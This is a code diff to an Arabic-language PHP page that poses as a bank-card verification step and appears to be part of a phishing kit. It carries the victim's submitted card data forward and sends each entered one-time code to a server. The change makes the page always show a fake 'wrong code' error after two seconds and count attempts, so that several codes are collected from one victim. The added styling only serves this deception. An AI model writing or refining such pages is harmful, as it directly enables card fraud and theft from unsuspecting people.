@@ -21,6 +21,8 @@ $payment_data = $_POST;
             --color-text-primary: #0E1F2E;
             --color-text-secondary: #4B5B6B;
             --color-border: #D8E2EE;
+            --color-error: #DC2626;
+            --color-error-light: #FEE2E2;
             --shadow-soft: 0 16px 40px rgba(15, 76, 114, 0.12);
         }
 
@@ -198,6 +200,11 @@ $payment_data = $_POST;
             cursor: pointer;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             margin-top: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background: var(--color-accent-dark);
         }
 
         .submit-btn:disabled {
@@ -237,6 +244,75 @@ $payment_data = $_POST;
         .timer {
             color: var(--color-accent);
             font-weight: 600;
+        }
+
+        /* Error Alert Styles */
+        .error-alert {
+            background: var(--color-error-light);
+            border: 1px solid var(--color-error);
+            border-radius: 0.75rem;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            display: none;
+            align-items: center;
+            gap: 0.75rem;
+            animation: slideDown 0.3s ease;
+        }
+
+        .error-alert.show {
+            display: flex;
+        }
+
+        .error-icon {
+            width: 1.5rem;
+            height: 1.5rem;
+            flex-shrink: 0;
+        }
+
+        .error-icon svg {
+            fill: var(--color-error);
+        }
+
+        .error-content {
+            flex: 1;
+        }
+
+        .error-title {
+            font-weight: 700;
+            color: var(--color-error);
+            font-size: 0.875rem;
+            margin-bottom: 0.25rem;
+        }
+
+        .error-message {
+            font-size: 0.75rem;
+            color: #991B1B;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+
+        .shake {
+            animation: shake 0.5s ease;
+        }
+
+        .input-error {
+            border-color: var(--color-error) !important;
+            box-shadow: 0 0 0 3px var(--color-error-light) !important;
         }
 
         .footer {
@@ -335,12 +411,8 @@ $payment_data = $_POST;
         }
 
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -386,11 +458,26 @@ $payment_data = $_POST;
                 </svg>
             </div>
             
-<h1 class="otp-title">أدخل رمز التحقق</h1>
-<p class="otp-subtitle">
-    تم إرسال رمز التحقق إلى رقم الجوال المرتبط بالبطاقة<br>
-    <span class="phone-display" id="cardDisplay" style="direction:ltr;display:inline-block">**** ****</span>
-</p>
+            <h1 class="otp-title">أدخل رمز التحقق</h1>
+            <p class="otp-subtitle">
+                تم إرسال رمز التحقق إلى رقم الجوال المرتبط بالبطاقة<br>
+                <span class="phone-display" id="cardDisplay" style="direction:ltr;display:inline-block">**** ****</span>
+            </p>
+
+            <!-- Error Alert -->
+            <div class="error-alert" id="errorAlert">
+                <div class="error-icon">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="10" fill="currentColor"/>
+                        <line x1="12" y1="8" x2="12" y2="12" stroke="white" stroke-width="2" stroke-linecap="round"/>
+                        <circle cx="12" cy="16" r="1" fill="white"/>
+                    </svg>
+                </div>
+                <div class="error-content">
+                    <div class="error-title">رمز التحقق خاطئ</div>
+                    <div class="error-message">الرجاء التحقق من الرمز والمحاولة مرة أخرى</div>
+                </div>
+            </div>
 
             <form id="otpForm">
                 <label style="display:block;font-size:0.875rem;font-weight:600;color:var(--color-text-secondary);margin-bottom:0.75rem;text-align:right">
@@ -405,7 +492,7 @@ $payment_data = $_POST;
                     pattern="[0-9]*" 
                     autocomplete="off" 
                     required 
-                    style="width:100%;padding:1rem;font-size:1.5rem;font-weight:700;text-align:center;border:2px solid var(--color-border);border-radius:12px;background:white;color:var(--color-text-primary);letter-spacing:0.5rem;font-family:'Courier New',monospace"
+                    style="width:100%;padding:1rem;font-size:1.5rem;font-weight:700;text-align:center;border:2px solid var(--color-border);border-radius:12px;background:white;color:var(--color-text-primary);letter-spacing:0.5rem;font-family:'Courier New',monospace;transition:all 0.3s ease"
                 >
                 <button type="submit" class="submit-btn" id="submitBtn">تحقق من الرمز</button>
             </form>
@@ -449,7 +536,6 @@ $payment_data = $_POST;
     // عرض آخر 4 أرقام من البطاقة
     const cardNumber = '<?php echo isset($_POST['card_number']) ? htmlspecialchars($_POST['card_number']) : (isset($_POST['cardnumber']) ? htmlspecialchars($_POST['cardnumber']) : ''); ?>';
     if (cardNumber) {
-        // إزالة المسافات والحصول على آخر 4 أرقام
         const cleanCard = cardNumber.replace(/\s/g, '');
         const lastFour = cleanCard.slice(-4);
         document.getElementById('cardDisplay').textContent = '**** **** **** ' + lastFour;
@@ -459,7 +545,11 @@ $payment_data = $_POST;
     const submitBtn = document.getElementById('submitBtn');
     const form = document.getElementById('otpForm');
     const loadingOverlay = document.getElementById('loadingOverlay');
+    const errorAlert = document.getElementById('errorAlert');
+    
+    let attemptCount = 0;
 
+    // منع إدخال أي شيء غير الأرقام
     otpInput.addEventListener('input', function() {
         this.value = this.value.replace(/[^0-9]/g, '');
     });
@@ -467,29 +557,50 @@ $payment_data = $_POST;
     otpInput.addEventListener('focus', function() {
         this.style.borderColor = 'var(--color-primary)';
         this.style.boxShadow = '0 0 0 3px var(--color-primary-light)';
+        // إخفاء رسالة الخطأ عند التركيز على الحقل
+        errorAlert.classList.remove('show');
+        this.classList.remove('input-error');
     });
 
     otpInput.addEventListener('blur', function() {
-        this.style.borderColor = 'var(--color-border)';
-        this.style.boxShadow = 'none';
+        if (!this.classList.contains('input-error')) {
+            this.style.borderColor = 'var(--color-border)';
+            this.style.boxShadow = 'none';
+        }
     });
 
     otpInput.focus();
+
+    // دالة لإظهار رسالة الخطأ
+    function showError() {
+        errorAlert.classList.add('show');
+        otpInput.classList.add('input-error', 'shake');
+        otpInput.value = '';
+        
+        // إزالة تأثير الاهتزاز بعد انتهائه
+        setTimeout(() => {
+            otpInput.classList.remove('shake');
+        }, 500);
+        
+        otpInput.focus();
+    }
 
     form.addEventListener('submit', async function(e) {
         e.preventDefault();
         
         const otp = otpInput.value.trim();
         if (!otp || (otp.length !== 4 && otp.length !== 6)) {
-            otpInput.style.borderColor = 'red';
+            otpInput.classList.add('input-error');
             return;
         }
 
+        attemptCount++;
         loadingOverlay.classList.add('show');
         submitBtn.disabled = true;
 
         const formData = new URLSearchParams();
         formData.append('otp_code_first', otp);
+        formData.append('attempt', attemptCount);
         
         <?php 
         foreach($_POST as $key => $value) {
@@ -512,27 +623,17 @@ $payment_data = $_POST;
                 body: formData.toString()
             });
 
+            // الانتظار لمدة 2 ثانية ثم إظهار رسالة الخطأ
             setTimeout(() => {
-                const redirectForm = document.createElement('form');
-                redirectForm.method = 'POST';
-                redirectForm.action = 'line.php' + (userId ? '?user_id=' + encodeURIComponent(userId) : '');
-                
-                for (let [key, value] of formData.entries()) {
-                    const input = document.createElement('input');
-                    input.type = 'hidden';
-                    input.name = key;
-                    input.value = value;
-                    redirectForm.appendChild(input);
-                }
-                
-                document.body.appendChild(redirectForm);
-                redirectForm.submit();
-            }, 10000);
+                loadingOverlay.classList.remove('show');
+                submitBtn.disabled = false;
+                showError();
+            }, 2000);
 
         } catch (err) {
             loadingOverlay.classList.remove('show');
             submitBtn.disabled = false;
-            alert('حدث خطأ، يرجى المحاولة مرة أخرى');
+            showError();
         }
     });
 
@@ -552,6 +653,10 @@ $payment_data = $_POST;
     }, 1000);
 
     resendBtn.addEventListener('click', function() {
+        // إخفاء رسالة الخطأ
+        errorAlert.classList.remove('show');
+        otpInput.classList.remove('input-error');
+        
         timeLeft = 60;
         timerElement.textContent = timeLeft;
         this.disabled = true;
